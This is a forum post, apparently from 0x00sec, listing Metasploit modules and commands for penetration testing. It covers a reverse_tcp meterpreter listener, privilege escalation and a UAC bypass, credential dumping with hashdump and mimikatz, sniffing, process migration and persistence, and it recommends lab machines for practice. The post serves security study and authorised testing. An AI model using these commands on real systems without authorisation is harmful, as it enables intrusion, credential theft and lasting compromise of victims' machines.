    <link>https://0x00sec.org/t/tips-commands-hacking/15859</link>
    <description>Hello:grinning:, good to everyone I leave some of the commands and tips I have collected throughout my studies and pentesting certifications, everything can be useful.The post is probably not very organized, I&#39;m sorry for that but it can serve you many things for your pentesting.

 If you would like to learn hacking and pentesting I recommend some machines that are very complete and serve to practice many different techniques are: ***Nebula and Protostar*** 

Nebula: https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/

*Nebula: It takes a look at + SUID files + Permissions + Race conditions + Shell meta-variables + $PATH weaknesses + Scripting language weaknesses + Binary compilation failures At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.*

Protostar: https://old.liveoverflow.com/binary_hacking/protostar/index.html

Dradis-Framework(Create Reporte One-Click): https://dradisframework.com/ce/

**Some of the modules of metasploit**

&gt; *exploit/multi/samba/usermap_script*
&gt; *auxiliary/scanner/mysql/mysql_login*
&gt; *auxiliary/scanner/mysql/mysql_hashdump*
&gt; *auxiliary/admin/mysql/mysql_sql*
&gt; *auxiliary/scanner/postgres/postgres_login*
&gt; *auxiliary/scanner/postgres/postgres_hashdump*
&gt; *exploit/linux/postgres/postgres_payload*
&gt; *auxiliary/scanner/http/tomcat_mgr_login*
&gt; *exploit/multi/http/tomcat_mgr_deploy*



&gt; *help -meterpreters*
&gt; *background - Then interact with a session*
&gt; *sessions s-i 2 (Identifier)*
&gt; *meterpreter &gt; load -l*
&gt; *meterpreter &gt; load sniffer*
&gt; *migrate PID -&gt;  to migrate the process through the PID*

**Post explotation**
basically means the phases of operation once a victim&#39;s system has been compromised by the attacker.
If we already have a compromised machine and we want to see all the modules of post exploitation, only with type post / windows + enter we can see the modules that metasploit offers us

This module attempts to upgrade a command shell to meterpreter. The shell platform is automatically detected and the best version of meterpreter for the target is selected. Currently, meterpreter/reverse_tcp is used on Windows and Linux, with python/meterpreter/reverse_tcp’ used on all others.

&gt;*post/multi/manage/shell_to_meterpreter*

-------
&gt;*post/windows/gather/enum_logged_on_users*(view logged users)
&gt;*post/windows/gather/checkvm* (check if it is a virtual machine)
&gt;*post/windows/gather/forensics/browser_history*
&gt;*post/windows/gather/lsa_secrets*
&gt;*post/windows/gather/win_privs* (scale privileges)

If we need a reverse shell from metasploit we can use multi handler, for example, suppose we already have the machine compromised but we do not have a reverse shell, we follow these steps

&gt;*use exploit/multi/handler*
&gt;*set payload windows/meterpreter/reverse_tcp*
&gt;*set LHOST 192.168.99.243*(ip example)
&gt;*set LPORT 4444*
&gt;*exploit -j (sending PID to Background)*
&gt;*jobs*(we will be what are the processes that are running in the background)
&gt;*jobs -h*(help)

**server in python(2.7)**

&gt;*python -m SimpleHTTPServer 8000*

**server in python(3.x)**

&gt;*python -m http.server 8000*

 **Local Exploit**
Some of the methodologies when we have gained access to a machine and we have a user with low privileges and of course we want to get root. Suppose we have an exploit to launch and we escalate privileges

&gt;*use exploit/windows/local/ms15_051_client_copy_image*

we have got privileges and be NT / AUTHORITY-SYSTEM

We can see all user hashes by typing hashdump.

&gt;*meterpreter&gt;hashdump*

also if we have a local exploit and we launch it for example a bypass of uac, it is probably exploitable in windows7 without patching

&gt;*use exploit/windows/local/bypassuac*
&gt;*load -l* (the list of services we can upload)
&gt;*set session 5* (connect to session number 5)
&gt;*getsystem*(we can test if we get root automatically)
&gt;*load_sniffer*(we load a sniffer)
&gt;*sniffer_start 1*
&gt;*sniffer_dump 1*

you could investigate more about sniffer its other options that it has
**Do not forget that while you load more services in the process the meterpreter&#39;s memory grows, a good option is to migrate to another process also in case of losing the session for example:**

&gt;*migrate PID*

You can also use this module of metasploit to inject the meterpreter in all the processes that can be:

&gt;*use post/windows/manage/multi_meterpreter_inject*


If we want to dump the victim&#39;s ram
&gt;*load_winpem()*

mimikatz
&gt;*load_mimikatz*
&gt;*wdigest*
&gt;*load_kiwi*

**Persistence**

&gt;*use post/Windows/manage/persistence_exe*
&gt;*set Session x*
&gt;*info*
&gt;*set REXEPATH C:*

I hope something is helpful, thanks</description>
